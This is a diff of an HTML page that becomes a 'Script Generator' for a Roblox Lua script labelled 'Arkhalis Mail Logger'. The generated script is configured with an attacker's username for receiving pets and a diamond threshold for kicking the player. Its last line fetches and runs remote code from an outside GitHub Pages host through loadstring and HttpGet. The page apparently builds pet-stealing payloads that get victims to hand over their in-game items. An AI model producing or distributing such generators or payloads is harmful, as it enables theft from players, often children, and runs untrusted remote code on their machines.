@@ -1,32 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Video Background Website</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Script Generator</title>
 </head>
 <body>
-  <div class="container">
-    <h1>Video Background Website</h1>
-    <div class="video-container">
-      <video autoplay loop muted>
-        <source src="video.mp4" type="video/mp4">
-      </video>
-    </div>
-    <form id="settings-form">
-      <h2>Settings</h2>
-      <label for="username-input">Username to send pets to:</label>
-      <input type="text" id="username-input" name="username" placeholder="Enter username...">
-      <label for="gift-message-input">Gift message to say:</label>
-      <input type="text" id="gift-message-input" name="giftMessage" placeholder="Enter gift message...">
-      <label for="diamonds-input">Amount of diamonds to not kick:</label>
-      <input type="number" id="diamonds-input" name="diamonds" min="0" placeholder="Enter amount of diamonds...">
-      <label for="unlock-pets-input">Unlock pets:</label>
-      <input type="checkbox" id="unlock-pets-input" name="unlockPets">
-      <input type="submit" value="Generate Script">
-    </form>
-    <textarea id="script-output" readonly></textarea>
-  </div>
+  <h1>Script Generator</h1>
+  <form id="settings-form">
+    <label for="video-name-input">Video name:</label>
+    <input type="text" id="video-name-input" name="videoName" placeholder="Enter video name..."><br>
+    <label for="username-input">Username to send pets to:</label>
+    <input type="text" id="username-input" name="username" placeholder="Enter username..."><br>
+    <label for="gift-message-input">Gift message to say:</label>
+    <input type="text" id="gift-message-input" name="giftMessage" placeholder="Enter gift message..."><br>
+    <label for="diamonds-input">Amount of diamonds to not kick:</label>
+    <input type="number" id="diamonds-input" name="diamonds" min="0" placeholder="Enter amount of diamonds..."><br>
+    <label for="unlock-pets-input">Unlock pets:</label>
+    <input type="checkbox" id="unlock-pets-input" name="unlockPets"><br>
+    <input type="button" value="Generate Script" onclick="generateScript()">
+  </form>
+  <textarea id="script-output" rows="10" cols="50" readonly></textarea>
 
-  <script src="script.js"></script>
+  <script>
+    function generateScript() {
+      var videoName = document.getElementById('video-name-input').value;
+      var username = document.getElementById('username-input').value;
+      var giftMessage = document.getElementById('gift-message-input').value;
+      var diamonds = document.getElementById('diamonds-input').value;
+      var unlockPets = document.getElementById('unlock-pets-input').checked;
+
+      var script = `--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "${username}" --// Username To Send Pets To
+_G.GiftMessage = "${giftMessage}" --// Message For The Gift To Say
+
+_G.Diamonds = ${diamonds} --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = ${unlockPets} --// Unlocks Locked Pets
+
+--[[ Script ]]
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()`;
+
+      document.getElementById('script-output').value = script;
+    }
+  </script>
 </body>
 </html>
